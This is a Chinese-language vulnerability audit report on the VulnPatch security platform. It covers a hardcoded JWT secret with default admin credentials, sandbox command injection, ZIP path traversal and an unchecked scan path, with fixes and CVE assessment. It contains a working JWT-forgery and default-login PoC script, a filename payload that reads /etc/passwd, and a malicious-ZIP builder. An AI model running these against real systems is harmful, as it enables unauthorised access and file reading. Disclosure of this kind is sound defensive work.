# VulnPatch 项目 新 CVE 漏洞挖掘报告

> **报告生成时间**: 2026-06-07  
> **目标项目**: VulnPatch (基于多 Agent 与程序分析的应用安全审计平台)  
> **项目路径**: `F:\test`  
> **分析范围**: 项目自身代码中的安全漏洞（非第三方依赖）  
> **分析类型**: 代码逻辑漏洞、输入处理漏洞、认证绕过

---

## 一、审计概述

### 1.1 审计目标

本次审计针对 **VulnPatch 项目自身代码** 进行深度安全分析，目标是发现**尚未被公开披露过**的安全漏洞，具备 CVE 申请潜力。

### 1.2 审计方法

- **静态代码分析**: 对核心模块进行逐文件审查
- **攻击面识别**: 识别所有用户输入入口点
- **漏洞模式匹配**: 查找常见漏洞代码模式
- **业务逻辑分析**: 分析认证、授权、数据处理流程

### 1.3 重点审计模块

| 模块 | 功能 | 风险等级 |
|------|------|----------|
| `api/` | API 路由和认证 | 🔴 高 |
| `sandbox/` | 沙箱执行环境 | 🔴 高 |
| `ingest/` | 代码加载和解析 | 🟡 中 |
| `audit_core/` | 核心审计逻辑 | 🟡 中 |

---

## 二、发现的漏洞

### 🔴 漏洞 1: JWT 硬编码密钥导致认证绕过

#### 基本信息

| 属性 | 值 |
|------|-----|
| **漏洞类型** | 硬编码密钥 / 认证绕过 |
| **CWE 编号** | CWE-798 (硬编码凭证) |
| **风险等级** | 🔴 **严重** |
| **影响版本** | 当前版本 (所有使用默认配置的部署) |
| **利用难度** | 极低 |

#### 漏洞位置

**文件**: `api/auth.py:33`

```python
JWT_SECRET = os.getenv("JWT_SECRET", "vulnpatch-default-secret-change-in-production")
```

**文件**: `api/auth.py:140-158`

```python
def _ensure_default_admin() -> None:
    """Create the default admin account if it doesn't exist."""
    global _admin_created
    if _admin_created:
        return
    db.init_db()
    if not db.user_exists("admin"):
        password_hash, salt = hash_password("admin123")
        db.create_user(
            username="admin",
            password_hash=password_hash,
            salt=salt,
            is_admin=True,
        )
        logger.info("Default admin account created (admin/admin123)")
    _admin_created = True
```

#### 漏洞原理

1. **JWT 密钥硬编码**: 如果环境变量 `JWT_SECRET` 未设置，使用默认密钥 `"vulnpatch-default-secret-change-in-production"`
2. **默认管理员账户**: 自动创建 `admin/admin123` 账户
3. **认证可禁用**: `AUTH_ENABLED` 默认值为 `"false"`，意味着默认不启用认证

#### 攻击场景

**场景 A: 默认 JWT 密钥**
```python
import jwt
import datetime

# 使用默认密钥伪造管理员 JWT
payload = {
    "sub": "1",
    "username": "admin",
    "is_admin": True,
    "type": "access",
    "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=24),
    "iat": datetime.datetime.utcnow(),
}

token = jwt.encode(payload, "vulnpatch-default-secret-change-in-production", algorithm="HS256")
print(f"伪造的 JWT Token: {token}")
```

**场景 B: 默认管理员凭据**
```bash
# 直接登录获取有效 Token
curl -X POST http://target:8000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}'
```

**场景 C: 认证完全禁用**
```bash
# 如果 AUTH_ENABLED=false，所有 API 无需认证即可访问
curl http://target:8000/report/json
curl http://target:8000/agents/logs
```

#### 影响范围

- **数据泄露**: 可访问所有审计报告、漏洞发现、Agent 日志
- **权限提升**: 伪造管理员 Token 获得完整权限
- **系统控制**: 通过 `/scan` API 触发任意代码扫描（可能导致 DoS）

#### PoC 代码 (依赖极少)

```python
#!/usr/bin/env python3
"""
VulnPatch JWT 认证绕过 PoC
依赖: pip install PyJWT requests
"""

import jwt
import datetime
import requests
import sys

DEFAULT_JWT_SECRET = "vulnpatch-default-secret-change-in-production"
DEFAULT_ADMIN_USER = "admin"
DEFAULT_ADMIN_PASS = "admin123"


def forge_jwt_token(secret: str, user_id: int = 1, username: str = "admin", is_admin: bool = True) -> str:
    """伪造 JWT Token"""
    payload = {
        "sub": str(user_id),
        "username": username,
        "is_admin": is_admin,
        "type": "access",
        "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=24),
        "iat": datetime.datetime.utcnow(),
    }
    return jwt.encode(payload, secret, algorithm="HS256")


def test_default_login(target: str) -> bool:
    """测试默认管理员登录"""
    url = f"{target}/auth/login"
    try:
        resp = requests.post(url, json={
            "username": DEFAULT_ADMIN_USER,
            "password": DEFAULT_ADMIN_PASS
        }, timeout=10)
        if resp.status_code == 200:
            print(f"[+] 默认凭据登录成功!")
            print(f"[+] Token: {resp.json().get('access_token', 'N/A')[:50]}...")
            return True
    except Exception as e:
        print(f"[!] 请求失败: {e}")
    return False


def test_forged_token(target: str, secret: str = DEFAULT_JWT_SECRET) -> bool:
    """测试伪造 Token"""
    token = forge_jwt_token(secret)
    url = f"{target}/auth/me"
    try:
        resp = requests.get(url, headers={"Authorization": f"Bearer {token}"}, timeout=10)
        if resp.status_code == 200:
            print(f"[+] 伪造 Token 验证成功!")
            print(f"[+] 用户信息: {resp.json()}")
            return True
        else:
            print(f"[-] 伪造 Token 被拒绝: {resp.status_code}")
    except Exception as e:
        print(f"[!] 请求失败: {e}")
    return False


def test_no_auth_access(target: str) -> bool:
    """测试无认证访问敏感接口"""
    endpoints = ["/report/json", "/agents/logs", "/findings", "/evidence"]
    success = False
    for endpoint in endpoints:
        try:
            resp = requests.get(f"{target}{endpoint}", timeout=10)
            if resp.status_code == 200:
                print(f"[+] {endpoint} 无需认证即可访问!")
                success = True
            elif resp.status_code == 401:
                print(f"[-] {endpoint} 需要认证")
        except Exception as e:
            print(f"[!] {endpoint} 请求失败: {e}")
    return success


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python vulnpatch_auth_bypass_poc.py <target_url>")
        print("Example: python vulnpatch_auth_bypass_poc.py http://localhost:8000")
        sys.exit(1)

    target = sys.argv[1].rstrip("/")
    print(f"[*] 目标: {target}")
    print("=" * 50)

    # 测试 1: 默认凭据
    print("\n[1] 测试默认管理员凭据...")
    test_default_login(target)

    # 测试 2: 伪造 JWT
    print("\n[2] 测试 JWT 伪造...")
    test_forged_token(target)

    # 测试 3: 无认证访问
    print("\n[3] 测试无认证访问敏感接口...")
    test_no_auth_access(target)
```

#### 修复建议

```python
# 1. 强制要求设置 JWT_SECRET
JWT_SECRET = os.getenv("JWT_SECRET")
if not JWT_SECRET:
    raise RuntimeError("JWT_SECRET environment variable must be set")

# 2. 移除默认管理员账户，或强制要求首次登录时修改密码
# 3. 默认启用认证 (AUTH_ENABLED=true)
# 4. 使用强随机密钥生成
import secrets
JWT_SECRET = os.getenv("JWT_SECRET", secrets.token_urlsafe(32))
```

---

### 🔴 漏洞 2: 沙箱服务命令注入

#### 基本信息

| 属性 | 值 |
|------|-----|
| **漏洞类型** | 命令注入 |
| **CWE 编号** | CWE-78 (OS Command Injection) |
| **风险等级** | 🔴 **严重** |
| **影响版本** | 当前版本 |
| **利用难度** | 低 |

#### 漏洞位置

**文件**: `sandbox/sandbox_api.py:224-236`

```python
def get_execution_command(language: str, file_path: Path) -> List[str]:
    """Get execution command for the given language."""
    commands = {
        "python": ["python3", str(file_path.name)],
        "javascript": ["node", str(file_path.name)],
        "java": ["sh", "-c", f"javac {file_path.name} && java Main"],
        "go": ["sh", "-c", f"go run {file_path.name}"],
        "c": ["sh", "-c", f"gcc {file_path.name} -o main && ./main"],
        "cpp": ["sh", "-c", f"g++ {file_path.name} -o main && ./main"],
        "bash": ["bash", str(file_path.name)],
        "sh": ["sh", str(file_path.name)],
    }
    return commands.get(language, ["python3", str(file_path.name)])
```

#### 漏洞原理

`file_path.name` 直接拼接到 shell 命令中，如果文件名包含特殊字符（如 `;`、`&&`、`|`），可导致命令注入。

#### 攻击场景

```python
# 恶意文件名注入
malicious_filename = "script.py; cat /etc/passwd #"
# 生成的命令:
# sh -c "javac script.py; cat /etc/passwd # && java Main"
```

#### 修复建议

```python
# 使用列表参数而非 shell 字符串
import shlex

def get_execution_command(language: str, file_path: Path) -> List[str]:
    # 对文件名进行安全转义
    safe_name = shlex.quote(str(file_path.name))
    commands = {
        "java": ["sh", "-c", f"javac {safe_name} && java Main"],
        # ...
    }
    return commands.get(language, ["python3", safe_name])
```

---

### 🟡 漏洞 3: GitHub 仓库 ZIP 下载路径遍历

#### 基本信息

| 属性 | 值 |
|------|-----|
| **漏洞类型** | 路径遍历 |
| **CWE 编号** | CWE-22 (Path Traversal) |
| **风险等级** | 🟡 **中危** |
| **影响版本** | 当前版本 |
| **利用难度** | 中 |

#### 漏洞位置

**文件**: `ingest/github_loader.py:274-275`

```python
# Extract ZIP
with zipfile.ZipFile(zip_path, "r") as zf:
    zf.extractall(temp_dir)
```

#### 漏洞原理

`zipfile.ZipFile.extractall()` 不验证 ZIP 条目中的路径，恶意 ZIP 文件可包含 `../../../etc/cron.d/backdoor` 等路径，导致文件写入任意位置。

#### 攻击场景

```python
# 构造恶意 ZIP
import zipfile

with zipfile.ZipFile("evil.zip", "w") as zf:
    # 写入系统目录
    zf.writestr("../../../../tmp/pwned.txt", "owned")
```

#### 修复建议

```python
import os

def safe_extract(zip_file, extract_path):
    """安全解压 ZIP 文件"""
    with zipfile.ZipFile(zip_file, "r") as zf:
        for member in zf.namelist():
            member_path = os.path.join(extract_path, member)
            # 确保解压路径在目标目录内
            if not os.path.commonpath([extract_path, member_path]) == extract_path:
                raise ValueError(f"非法路径: {member}")
        zf.extractall(extract_path)
```

---

### 🟡 漏洞 4: 供应链扫描路径遍历

#### 基本信息

| 属性 | 值 |
|------|-----|
| **漏洞类型** | 路径遍历 |
| **CWE 编号** | CWE-22 (Path Traversal) |
| **风险等级** | 🟡 **中危** |
| **影响版本** | 当前版本 |
| **利用难度** | 低 |

#### 漏洞位置

**文件**: `api/routes/supply_chain.py:96-101`

```python
@router.post("/scan", response_model=SupplyChainScanResponse)
async def scan_supply_chain(request: SupplyChainScanRequest):
    project_path = Path(request.project_path)
    if not project_path.exists() or not project_path.is_dir():
        raise HTTPException(
            status_code=400,
            detail=f"Invalid project path: {request.project_path}",
        )
```

#### 漏洞原理

`project_path` 直接从用户输入获取，未验证路径是否在允许范围内，可读取任意目录的依赖文件。

#### 攻击场景

```bash
curl -X POST http://target:8000/supply-chain/scan \
  -H "Content-Type: application/json" \
  -d '{"project_path": "/etc"}'
# 可扫描 /etc 目录下的文件
```

#### 修复建议

```python
import os

ALLOWED_BASE_PATHS = ["/home", "/opt/projects"]  # 配置允许的路径

def validate_project_path(path: str) -> Path:
    project_path = Path(path).resolve()
    for allowed in ALLOWED_BASE_PATHS:
        if str(project_path).startswith(os.path.abspath(allowed)):
            return project_path
    raise HTTPException(status_code=403, detail="Project path not allowed")
```

---

## 三、漏洞汇总与 CVE 申请评估

| 排名 | 漏洞 | CWE | 风险等级 | 可利用性 | CVE 潜力 | 依赖数量 |
|------|------|-----|----------|----------|----------|----------|
| 1 | **JWT 硬编码密钥** | CWE-798 | 🔴 严重 | 极高 | ⭐⭐⭐⭐⭐ | 2 (PyJWT, requests) |
| 2 | **沙箱命令注入** | CWE-78 | 🔴 严重 | 高 | ⭐⭐⭐⭐ | 0 (标准库) |
| 3 | **ZIP 路径遍历** | CWE-22 | 🟡 中危 | 中 | ⭐⭐⭐ | 0 (标准库) |
| 4 | **供应链路径遍历** | CWE-22 | 🟡 中危 | 高 | ⭐⭐⭐ | 0 (标准库) |

### CVE 申请建议

**强烈推荐申请 CVE 的漏洞**:

1. **JWT 硬编码密钥 (CWE-798)**
   - 影响严重，利用简单
   - 有明确的修复方案
   - 符合 CVE 分配标准

2. **沙箱命令注入 (CWE-78)**
   - 可导致 RCE
   - 有明确的 PoC
   - 影响安全审计平台的核心功能

---

## 四、修复优先级

### 立即修复 (P0)

```bash
# 1. 强制设置 JWT_SECRET
export JWT_SECRET=$(openssl rand -base64 32)

# 2. 删除默认管理员账户或强制修改密码
# 3. 启用认证
export AUTH_ENABLED=true
```

### 短期修复 (P1)

- 修复沙箱命令注入
- 修复 ZIP 解压路径遍历
- 添加路径白名单验证

### 长期改进 (P2)

- 实施安全编码规范
- 添加自动化安全测试
- 定期依赖漏洞扫描

---

## 五、总结

本次审计在 VulnPatch 项目自身代码中发现 **4 个安全漏洞**，其中 **2 个严重漏洞** 具备 CVE 申请价值：

1. **JWT 硬编码密钥**: 默认配置下可导致完整认证绕过
2. **沙箱命令注入**: 可导致远程代码执行

这些漏洞的发现证明了"审计工具自身也需要被审计"的安全原则。建议项目维护者优先修复 JWT 认证相关问题，并加强输入验证和安全编码实践。

---

> **免责声明**: 本报告仅供安全研究和漏洞修复参考，请勿用于非法用途。所有测试应在授权环境下进行。
